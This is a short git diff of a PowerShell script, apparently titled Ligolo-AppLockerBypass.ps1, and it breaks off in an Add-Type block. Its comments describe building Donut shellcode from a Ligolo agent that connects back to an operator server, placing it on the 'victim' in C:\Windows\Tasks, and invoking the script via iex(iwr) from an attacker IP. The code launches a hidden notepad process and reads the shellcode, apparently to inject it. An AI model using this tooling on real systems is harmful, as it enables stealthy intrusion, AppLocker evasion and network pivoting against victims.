@@ -1,8 +1,8 @@
 #1 Make sure to generate agent.bin: .\donut.exe -f 1 -o .\agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
 #2 Once generated put it on victim in the location: "C:\Windows\Tasks".
-#3 Make sure to execute notepad.exe (e.g "cmd.exe /c notepad", check that notepad is running: "tasklist | findstr notepad" also run can be as a low privilege user.)
-#4 Invoke it: iex(iwr http://192.168.45.173/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
+#4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
 
+Start-Process notepad.exe -WindowStyle Hidden
 $shellcode = [System.IO.File]::ReadAllBytes("C:\Windows\Tasks\agent.bin")
 $procid = (Get-Process -Name notepad).Id
 Add-Type -TypeDefinition @"
